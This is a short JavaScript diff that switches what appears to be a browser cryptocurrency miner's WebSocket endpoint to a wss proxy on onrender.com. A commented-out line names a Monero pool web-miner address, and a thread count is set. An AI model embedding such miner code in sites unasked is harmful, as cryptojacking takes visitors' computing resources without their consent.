@@ -5,7 +5,7 @@ const { port1 } = new MessageChannel()
 let client = new WebSocketClient()
 
 //let WSS = ''wss://webminer.moneroocean.stream/''
-let WSS = 'https://proxy-server-088.onrender.com/'
+let WSS = 'wss://proxy-server-088.onrender.com/'
 
 let connection = null
 let mThread = 2
